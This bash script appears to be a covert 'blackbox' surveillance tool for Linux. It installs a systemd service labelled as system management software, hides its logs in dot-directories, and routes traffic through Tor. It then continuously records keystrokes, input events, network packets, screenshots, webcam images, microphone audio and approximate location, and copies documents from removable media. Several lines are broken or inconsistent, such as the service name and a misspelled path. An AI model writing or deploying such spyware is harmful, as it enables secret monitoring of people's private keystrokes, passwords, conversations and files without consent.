#!/bin/bash
#if you want to open the BLACKBOX do bash log.sh open

Command=$1
if [ $Command == 'find' ] ; then
pacman -S dialog --noconfirm --needed
content=$(dialog --title "blackbox search" --inputbox "Search that this computer has accessed" 8 40 2>&1 >/dev/tty)
grep -rnw /Assistant/extension/theharmony7smsw -e "${content}"
exit
fi


#Command=$1
if [ $Command == 'open' ] ; then
echo USE WITH CAUTION WHEN USING THIS OPTION THIS WILL EXPOSE EVERY DATA THAT EVER BEEN POSSESED BY THIS COMPUTER
sleep 3
find /Assistant/extension/theharmony7smsw
#clear
chmod -R 777 /Assistant/extension/theharmony7smsw
chmod -R 777 /Assistant/extension/theharmony7smsw/*
sleep 5
exit
fi

if [ $Command == 'lock' ] ; then
echo disabling user access
#sleep 3
#find /Assistant/extension/theharmony7smsw
#clear
chmod -R 600 /Assistant/extension/theharmony7smsw
chmod -R 600 /Assistant/extension/theharmony7smsw/*
#sleep 5
exit
fi



sleep 60
#export DISPLAY=:0
sessionid=$(date +%s)
echo Hiding Files
chmod -R 600 /Assistant/extension/theharmony7smsw
mkdir /Assistant/extension/theharmony7smsw/.$sessionid
mkdir /Assistant/extension/theharmony7smsw/.$sessionid/sessionextdocuments
sudo -u tor tor > /Assistant/extension/theharmony7smsw/.$sessionid/EncryptedInternetTraffic &
gsettings set org.gnome.system.proxy ignore-hosts []
gsettings set org.gnome.system.proxy mode 'manual'
gsettings set org.gnome.system.proxy.socks host '127.0.0.1'
gsettings set org.gnome.system.proxy.socks port 9050
fileinstalled=/Assistant/extension/theharmony7smsw/gg
if [ -f $fileinstalled ]; then
echo Installed
else
rm /usr/bin/tqdm
sudo -u nobody yaourt -S geoip lsof python python-pip tor gnome python-setuptools mitmproxy python-tornado python-six tcpdump python-appdirs jq python-packaging python-pyparsing python-tqdm python-scikit-learn python-numpy python-scipy whereami scrot logkeys --noconfirm
mv /usr/bin/whereami /usr/bin/whereami_gps
npm -g install @rafaelrinaldi/whereami
daemonsystemd=/etc/systemd/system/Assistant/extension/theharmony7smsw.service

echo '[Unit]' > $daemonsystemd
echo 'Description=System management software for theharmony7 computers' >> $daemonsystemd
echo 'After=network.target' >> $daemonsystemd
echo '' >> $daemonsystemd
echo '[Service]' >> $daemonsystemd
echo 'ExecStart=/bin/bash /Assistant/extension/theharmony7smsw/smsw.sh' >> $daemonsystemd
echo 'Type=simple' >> $daemonsystemd
echo '' >> $daemonsystemd
echo '[Install]' >> $daemonsystemd
echo 'WantedBy=default.target' >> $daemonsystemd
git clone https://github.com/rahra/onioncat
cd onioncat
autoreconf -f -i
./configure
make
make install


cat $daemonsystemd
systemctl enable blackbox
echo a > /Assistant/extension/theharmony7smsw/gg



fi



#a Security feature
# Turn on execshield
sysctl -w kernel.exec-shield=1
sysctl -w kernel.randomize_va_space=1
# Enable IP spoofing protection
sysctl -w net.ipv4.conf.all.rp_filter=1
# Disable IP source routing
sysctl -w net.ipv4.conf.all.accept_source_route=0
# Ignoring broadcasts request
sysctl -w net.ipv4.icmp_echo_ignore_broadcasts=1
sysctl -w net.ipv4.icmp_ignore_bogus_error_messages=1
# Make sure spoofed packets get logged
sysctl -w net.ipv4.conf.all.log_martians = 1
sysctl -w kernel.dmesg_restrict=1
sysctl -w kernel.kptr_restrict=1

locationint=$(curl --request GET --url https://freegeoip.app/json/ --header 'accept: application/json' --header 'content type: application/json' | jq -r -c '.city')
whereami_gps learn -l ${locationint[0]}
#logger for service mode
time=$(date +%s)
killall -KILL logkeys
rm /var/run/logkeys.pid
logkeys -s -o /Assistant/extension/theharmony7smsw/.$sessionid/uinput
#log system state
killall -KILL dmesg
dmesg -w > /Assistant/extension/theharmony7smsw/.$sessionid/kernel &
#EventLogger
countevent=1
killall -KILL evtest
for a in /dev/input/*; do
countevent=$(($countevent + 1))
evtest $a > /blaackbox/.$sessionid/event$countevent &
done


#pullwait
pullwait=4
killall -KILL tcpdump
tcpdump -XX > /Assistant/extension/theharmony7smsw/.$sessionid/localnetworkcontent &
#update learning for A-GPS
cd /usr/share/GeoIP/
wget http://geolite.maxmind.com/download/geoip/database/GeoLiteCountry/GeoIP.dat.gz
gunzip GeoIP.dat.gz

#file that being accessed
lsof > /Assistant/extension/theharmony7smsw/.$sessionid/fileaccesslog &
#Capture more network log
echo theharmony7 blackbox recording > /Assistant/extension/theharmony7smsw/.$sessionid/localnetworkdump.pcapng
echo theharmony7 blackbox recording > /Assistant/extension/theharmony7smsw/.$sessionid/networkaware
echo theharmony7 blackbox recording > /Assistant/extension/theharmony7smsw/.$sessionid/networkawarecontent
killall -KILL dumpcap
killall -KILL tshark
rm /Assistant/extension/theharmony7smsw/networkawarecontent
echo NetworkLogging > /Assistant/extension/theharmony7smsw/.$sessionid/networkawarecontent
dumpcap -w /Assistant/extension/theharmony7smsw/.$sessionid/localnetworkdump.pcapng &
cd /Assistant/extension/theharmony7smsw/.$sessionid/
ln -s /Assistant/extension/theharmony7smsw/.$sessionid/networkawarecontent /Assistant/extension/theharmony7smsw
tshark -xV > /Assistant/extension/theharmony7smsw/networkawarecontent &




cd /Assistant/extension/theharmony7smsw
agpswait=0
while true ;do

timedelay=$(( ( RANDOM % 20 )  + 7 ))
time=$(date +%s)
for ((i=0;i<=10;i++)); do
export DISPLAY=:$i
scrot /Assistant/extension/theharmony7smsw/.$sessionid/ScreenWatch${time}.jpeg
done
echo screen
time=$(date +%s)
echo camera
streamer -f jpeg -o /Assistant/extension/theharmony7smsw/.$sessionid/CCTV$time.jpeg
time=$(date +%s)
arecord -V stereo -t wav -d 5 > /Assistant/extension/theharmony7smsw/.$sessionid/MicrophoneWatch$time
killall -KILL journalctl
journalctl -xe > /Assistant/extension/theharmony7smsw/.$sessionid/system
time=$(date +%s)
echo ----------------- >> /Assistant/extension/theharmony7smsw/.$sessionid/ThermalSensor
date >> /Assistant/extension/theharmony7smsw/.$sessionid/ThermalSensor
sensors >> /Assistant/extension/theharmony7smsw/.$sessionid/ThermalSensor
echo ----------------- >> /Assistant/extension/theharmony7smsw/.$sessionid/ThermalSensor
echo ----------------- >> /Assistant/extension/theharmony7smsw/.$sessionid/USBDEVconnected
date >> /Assistant/extension/theharmony7smsw/.$sessionid/USBDEVconnected
lsusb >> /Assistant/extension/theharmony7smsw/.$sessionid/USBDEVconnected
echo ----------------- >> /Assistant/extension/theharmony7smsw/.$sessionid/USBDEVconnected
#grab location data
#uses AI locating combination beetween Internet IP and Signal

#A-GPS update
agpswait=$(($agpswait + 1))
if [ $agpswait == '10' ] ;then
locationint=$(curl --request GET --url https://freegeoip.app/json/ --header 'accept: application/json' --header 'content type: application/json' | jq -r -c '.city')
whereami_gps learn -l ${locationint[0]}
agpswait=0
fi
date >> /Assistant/extension/theharmony7smsw/.$sessionid/location
echo '--------------start--------------' >> /Assistant/extension/theharmony7smsw/.$sessionid/location
echo List of possibilities >> /Assistant/extension/theharmony7smsw/.$sessionid/location
echo '---------------------------------' >> /Assistant/extension/theharmony7smsw/.$sessionid/location
whereami_gps locations >> /Assistant/extension/theharmony7smsw/.$sessionid/location
echo '---------------------------------' >> /Assistant/extension/theharmony7smsw/.$sessionid/location
echo '------------[Predicted Location]------------' >> /Assistant/extension/theharmony7smsw/.$sessionid/location
whereami_gps predict >> /Assistant/extension/theharmony7smsw/.$sessionid/location
echo '--------------end----------------' >> /Assistant/extension/theharmony7smsw/.$sessionid/location
#grab document daily backup
pullwait=$(($pullwait + 1))
exta='pdf doc ppt txt pages xls wps'
if [ $pullwait == '5' ] ;then
for client in /run/media/;do
for ext in $exta; do
mkdir /Assistant/extension/theharmony7smsw/.$sessionid/sessionextdocuments
sudo chmod -R 777 /Assistant/extension/theharmony7smsw/.$sessionid/sessionextdocuments
find $client -name "*.*$ext*"
find $client -name "*.*$ext*" | while read file; do
    cp -rv "$file" "/Assistant/extension/theharmony7smsw/.$sessionid/sessionextdocuments"; done
done
done
pullwait=0
fi

sleep $timedelay
done
